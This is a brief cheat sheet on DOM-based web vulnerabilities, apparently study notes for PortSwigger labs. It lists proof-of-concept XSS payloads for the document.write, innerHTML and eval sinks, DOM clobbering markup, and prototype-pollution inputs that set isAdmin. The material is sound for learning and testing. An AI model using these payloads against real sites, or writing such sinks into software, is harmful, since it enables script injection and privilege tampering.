# PortSwigger DOM-Based Vulnerabilities — Complete Reference

## DOM XSS via document.write
```javascript
// Source: location.search/location.hash
// Sink: document.write()
document.write('<img src="' + input + '">')
// Payload: "><svg onload=alert(1)>
```

## DOM XSS via innerHTML
```javascript
element.innerHTML = input
// Payload: <img src=x onerror=alert(1)>
```

## DOM XSS via eval
```javascript
eval(input)
// Payload: alert(1)
```

## DOM XSS via onerror/onload
```javascript
// Source: location.hash, window.name, document.referrer
// Sink: element.onload, img.src
```

## DOM Clobbering
```html
<!-- Override global variables -->
<a id="defaultAvatar">
<a id="defaultAvatar" name="avatar" href="x:alert(1)">
```

## Prototype Pollution (Client-Side)
```javascript
// Via URL params
__proto__.isAdmin=true
// Via JSON
{"__proto__":{"isAdmin":true}}
```
